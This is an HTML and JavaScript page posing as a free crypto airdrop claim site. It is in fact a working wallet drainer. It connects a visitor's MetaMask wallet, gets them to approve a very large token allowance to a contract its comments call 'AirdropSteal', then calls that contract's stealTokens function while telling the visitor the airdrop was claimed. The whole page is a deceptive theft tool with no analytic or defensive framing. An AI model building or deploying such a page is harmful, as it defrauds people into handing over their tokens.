<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>
    <h1>Claim Your Free Airdrop!</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="approveButton" style="display:none;">Approve Contract</button>
    <button id="airdropButton" style="display:none;">Claim Airdrop</button>

    <script>
        // Define ABIs for the ERC-20 token and the AirdropSteal contract
        const tokenABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "spender", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "name": "", "type": "bool" }],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{ "name": "owner", "type": "address" }],
                "name": "balanceOf",
                "outputs": [{ "name": "", "type": "uint256" }],
                "type": "function"
            }
        ];

        const airdropContractABI = [
            {
                "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Contract addresses
        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // Token contract address to steal from
        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5"; // AirdropSteal contract address
     

        let web3;
        let tokenContract;
        let airdropContract;
        let userAddress;

        // Function to connect MetaMask
        async function connectMetaMask() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];

                    // Initialize contracts
                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
                    airdropContract = new web3.eth.Contract(airdropContractABI, contractAddress);

                    // Hide the connect button and show the approve button
                    document.getElementById('connectButton').style.display = 'none';
                    document.getElementById('approveButton').style.display = 'block';
                } catch (error) {
                    console.error("MetaMask connection failed", error);
                    alert("Please connect your MetaMask wallet.");
                }
            } else {
                alert("MetaMask not detected! Please install MetaMask.");
            }
        }

        // Function to approve the contract to spend tokens
        async function approveContract() {
            try {
                // Set a very high allowance to ensure the contract can access all tokens
                const maxAllowance = web3.utils.toWei('1000000', 'ether'); // Replace with a suitable allowance if needed

                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 100000; // Set a reasonable gas limit

                await tokenContract.methods.approve(contractAddress, maxAllowance).send({
                    from: userAddress,
                    gasPrice: gasPrice,
                    gas: gasLimit
                });

                alert("Contract approved to spend your tokens!");
                document.getElementById('approveButton').style.display = 'none';
                document.getElementById('airdropButton').style.display = 'block';
            } catch (error) {
                console.error("Error approving contract:", error);
                alert("Approval failed! Check the console for more details.");
            }
        }

        // Function to claim the airdrop (execute the stealTokens function)
        async function claimAirdrop() {
            try {
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 100000; // Set a reasonable gas limit

                // Call the stealTokens function
                await airdropContract.methods.stealTokens(tokenAddress).send({
                    from: userAddress,
                    gasPrice: gasPrice,
                    gas: gasLimit
                });

                alert("Airdrop claimed! Tokens transferred.");
            } catch (err) {
                console.error("Error claiming the airdrop:", err);
                alert("Transaction failed! Check the console for more details.");
            }
        }

        // Event listeners for the buttons
        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
        document.getElementById('approveButton').addEventListener('click', approveContract);
        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
    </script>
</body>
</html>
